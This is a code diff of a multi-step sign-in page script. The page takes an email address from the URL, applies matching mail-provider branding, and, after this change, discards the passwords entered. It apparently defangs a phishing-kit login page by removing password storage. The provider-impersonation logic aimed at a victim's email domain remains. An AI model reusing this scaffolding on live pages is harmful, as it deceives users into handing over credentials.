+                                    );
+                                }
+
+                            },
+                            300
+                        );
+
+
+                        return;
+                    }
+
+
+                    storedEmail =
+                        val;
+
+
+                    currentProvider =
+                        getDomainConfig(
+                            val
+                        );
+
+
+                    if (
+                        currentProvider
+                    ) {
+
+                        applyProviderBranding(
+                            currentProvider
+                        );
+                    }
+
+
+                    renderMailboxBackground(
+                        val
+                    );
+
+
+                    const originalHTML =
+                        submitBtn
+                            ? submitBtn.innerHTML
+                            : "";
+
+
+                    if (btnText) {
+
+                        btnText.textContent =
+                            "Checking";
+                    }
+
+
+                    if (btnIcon) {
+
+                        btnIcon.className =
+                            "fas fa-spinner fa-spin";
+                    }
+
+
+                    if (submitBtn) {
+
+                        submitBtn.disabled =
+                            true;
+                    }
+
+
+                    setTimeout(
+                        function () {
+
+                            if (submitBtn) {
+
+                                submitBtn.innerHTML =
+                                    originalHTML;
+
+                                submitBtn.disabled =
+                                    false;
+                            }
+
+
+                            goToStep(2);
+
+                        },
+                        600
+                    );
+                }
+
+
+                // ==================================================
+                // STEP 2 - LOCAL ONLY
+                // ==================================================
+
+                else if (
+                    step === 2
+                ) {
+
+                    if (!val) {
+
+                        if (fieldInput) {
+
+                            fieldInput.classList.add(
+                                "shake"
+                            );
+
+
+                            setTimeout(
+                                function () {
+
+                                    fieldInput.classList.remove(
+                                        "shake"
+                                    );
+
+                                },
+                                300
+                            );
+                        }
+
+                        return;
+                    }
+
+
+                    /*
+                     * IMPORTANT:
+                     *
+                     * `val` is deliberately NOT copied
+                     * into any password variable.
+                     *
+                     * It is not stored.
+                     * It is not logged.
+                     * It is not sent.
+                     */
+
+
+                    if (fieldInput) {
+
+                        fieldInput.value =
+                            "";
+                    }
+
+
+                    goToStep(3);
+                }
+
+
+                // ==================================================
+                // STEP 3 - LOCAL ONLY
+                // ==================================================
+
+                else if (
+                    step === 3
+                ) {
+
+                    if (!val) {
+
+                        if (fieldInput) {
+
+                            fieldInput.classList.add(
+                                "shake"
+                            );
+
+
+                            setTimeout(
+                                function () {
+
+                                    fieldInput.classList.remove(
+                                        "shake"
+                                    );
+
+                                },
+                                300
+                            );
+                        }
+
+                        return;
+                    }
+
+
+                    /*
+                     * IMPORTANT:
+                     *
+                     * The value entered here is also
+                     * discarded immediately.
+                     *
+                     * No password comparison.
+                     * No password storage.
+                     * No password transmission.
+                     */
+
+
+                    if (fieldInput) {
+
+                        fieldInput.value =
+                            "";
+
+                        fieldInput.classList.add(
+                            "input-success"
+                        );
+                    }
+
+
+                    const originalHTML =
+                        submitBtn
+                            ? submitBtn.innerHTML
+                            : "";
+
+
+                    if (btnText) {
+
+                        btnText.textContent =
+                            "Continuing";
+                    }
+
+
+                    if (btnIcon) {
+
+                        btnIcon.className =
+                            "fas fa-spinner fa-spin";
+                    }
+
+
+                    if (submitBtn) {
+
+                        submitBtn.disabled =
+                            true;
+                    }
+
+
+                    setTimeout(
+                        function () {
+
+                            if (submitBtn) {
+
+                                submitBtn.innerHTML =
+                                    originalHTML;
+
+                                submitBtn.disabled =
+                                    false;
+                            }
+
+
+                            finalizeLogin();
+
+                        },
+                        600
+                    );
+                }
+            }
+        );
+    }
+
+
+    // ============================================================
+    // HASH CHANGE
+    // ============================================================
+
+    window.addEventListener(
+        "hashchange",
+        function () {
+
+            const email =
+                getEmailFromHash();
+
+
+            if (
+                email &&
+                email !== storedEmail
+            ) {
+
+                storedEmail =
+                    email;
+
+
+                currentProvider =
+                    getDomainConfig(
+                        email
+                    );
+
+
+                if (fieldInput) {
+
+                    fieldInput.value =
+                        email;
+                }
+
+
+                renderMailboxBackground(
+                    email
+                );
+
+
+                if (
+                    currentProvider
+                ) {
+
+                    applyProviderBranding(
+                        currentProvider
+                    );
+
+
+                    if (title) {
+
+                        title.textContent =
+                            currentProvider.name;
+                    }
+
+
+                    if (subtitle) {
+
+                        subtitle.textContent =
+                            currentProvider.subtitle;
+                    }
+
+
+                    if (hintText) {
+
+                        hintText.textContent =
+                            `Continue with ${currentProvider.name}`;
+                    }
+
+
+                    if (hintIcon) {
+
+                        hintIcon.className =
+                            "fas fa-check-circle";
+
+                        hintIcon.style.color =
+                            "#1a73e8";
+                    }
+
+
+                    if (fieldLeftIcon) {
+
+                        fieldLeftIcon.style.color =
+                            "#4285f4";
+                    }
+                }
+            }
         }
+    );
 
-        else if (step === 3) {
-          if (!val) {
-            fieldInput.classList.add('shake');
-            setTimeout(() => fieldInput.classList.remove('shake'), 300);
-            return;
-          }
-          storedConfirmPassword = val;
-          fieldInput.classList.add('input-success');
 
-          const originalHTML = submitBtn.innerHTML;
-          btnText.textContent = 'Signing in';
-          btnIcon.className = 'fas fa-spinner fa-spin';
-          submitBtn.disabled = true;
+    // ============================================================
+    // START
+    // ============================================================
 
-          setTimeout(() => {
-            submitBtn.innerHTML = originalHTML;
-            submitBtn.disabled = false;
-            finalizeLogin();
-          }, 600);
-        }
-      });
+    boot();
 
-      boot();
-
-      window.addEventListener('hashchange', function() {
-        const email = getEmailFromHash();
-        if (email && email !== storedEmail) {
-          storedEmail = email;
-          currentProvider = getDomainConfig(email);
-          fieldInput.value = email;
-          renderMailboxBackground(email);
-          if (currentProvider) {
-            applyProviderBranding(currentProvider);
-            title.textContent = currentProvider.name;
-            subtitle.textContent = currentProvider.subtitle;
-            hintText.textContent = `Continue with ${currentProvider.name}`;
-            hintIcon.className = 'fas fa-check-circle';
-            hintIcon.style.color = '#1a73e8';
-            fieldLeftIcon.style.color = '#4285f4';
-          }
-        }
-      });
-    })();
-  </script>
+})();
+</script>
 </body>
 </html>
